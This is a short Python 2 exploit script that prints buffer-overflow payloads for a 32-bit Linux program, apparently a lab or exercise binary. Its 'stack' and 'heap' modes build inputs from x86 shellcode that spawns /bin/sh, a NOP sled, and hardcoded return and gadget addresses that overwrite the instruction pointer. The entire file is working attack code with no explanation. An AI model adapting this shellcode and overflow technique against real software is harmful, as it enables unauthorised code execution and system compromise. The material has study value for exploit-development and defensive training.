import sys
import struct

shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

def heapExp():
    tail = "\x00" * (80 - len(shellcode))
    new_eip = struct.pack('I', 0x0804a008)
    print shellcode + tail + new_eip

def stackExp():
    head = "\x90" * 80
    tail = "\x90" * 100
    gadget_addr = struct.pack('I', 0x0804853e)
    slide_addr = struct.pack('I', 0xbffff751)
    print head + gadget_addr + slide_addr + tail + shellcode

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "stack":
            stackExp()
        if sys.argv[1] == "heap":
            heapExp()
